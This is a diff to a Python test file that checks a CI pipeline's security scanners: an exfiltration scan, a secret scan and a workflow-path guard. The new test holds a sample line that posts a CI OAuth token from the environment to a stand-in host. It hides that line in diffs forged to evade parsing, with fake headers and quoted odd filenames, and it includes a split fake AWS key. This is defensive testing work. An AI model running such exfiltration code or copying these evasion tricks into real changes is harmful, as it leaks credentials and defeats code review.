@@ -752,6 +752,9 @@ def test_security_scan_runs_before_every_job_that_runs_pr_code():
     assert "${{ secrets." not in scan and "concurrency:" not in scan
     # The PR's .gitattributes must not hide changes from the diff-based scans.
     assert 'git -C pr diff --no-renames --text --no-textconv "$BASE_SHA...HEAD" > pr.diff' in scan
+    # Unquoted path lists, and no `# nosemgrep` waivers from the PR itself.
+    assert 'git -C pr diff --no-renames --name-only -z "$BASE_SHA...HEAD" > changed.txt' in scan
+    assert scan.count("--disable-nosem --metrics=off") == 2
 
 
 def test_exfil_scan_recognizes_every_ci_secret():
@@ -769,6 +772,39 @@ def test_exfil_scan_recognizes_every_ci_secret():
 
     assert "CLAUDE_CODE_OAUTH_TOKEN" in credentials
     assert [name for name in credentials if not scan["_SECRET"].search(name)] == []
+
+
+def test_security_scan_parsers_survive_diff_and_path_tricks(tmp_path):
+    # Added content must not pose as diff structure, and unusual names must not dodge the scans.
+    scripts = Path(__file__).parent.parent / ".github/scripts/security-scan"
+    steal = 'requests.post("https://x.example", data=os.environ["CLAUDE_CODE_OAUTH_TOKEN"])'
+    quoted = '"b/donn\\303\\251es.py"'  # how git writes a non-ASCII name in a header
+    diff = (
+        f"diff --git a/a.py b/a.py\n+++ b/a.py\n@@ -0,0 +1,2 @@\n+++ notes\n+{steal}\n"
+        f"diff --git a/x {quoted}\n+++ {quoted}\n@@ -0,0 +1,2 @@\n"
+        f"+# \fdiff --git a b\n+{steal}\n"
+    )
+    exfil = runpy.run_path(str(scripts / "exfil-scan.py"))
+    assert [path for path, _ in exfil["scan_diff"](diff)[0]] == ["a.py", "données.py"]
+
+    key = "AKIA" + "Q3EXAMPLEZ7XK2LM"  # split so the literal isn't a key
+    (tmp_path / "pr.diff").write_text(f"diff --git a/n b/n\n+++ b/n\n@@ -0,0 +1 @@\n+++ {key}\n")
+    secret = subprocess.run(
+        [sys.executable, str(scripts / "secret-scan.py")],
+        env={**os.environ, "DIFF_FILE": str(tmp_path / "pr.diff")},
+        capture_output=True,
+        text=True,
+    )
+    assert secret.returncode == 1 and "AWS access key id" in secret.stdout
+
+    (tmp_path / "changed").write_bytes(".github/workflows/ü.yml\0".encode())
+    guard = subprocess.run(
+        ["bash", str(scripts / "sensitive-paths.sh")],
+        env={**os.environ, "CHANGED_FILES": str(tmp_path / "changed")},
+        capture_output=True,
+        text=True,
+    )
+    assert guard.returncode == 1
 
 
 def test_user_journey_gate_runs_for_in_repo_prs_or_a_member_command():
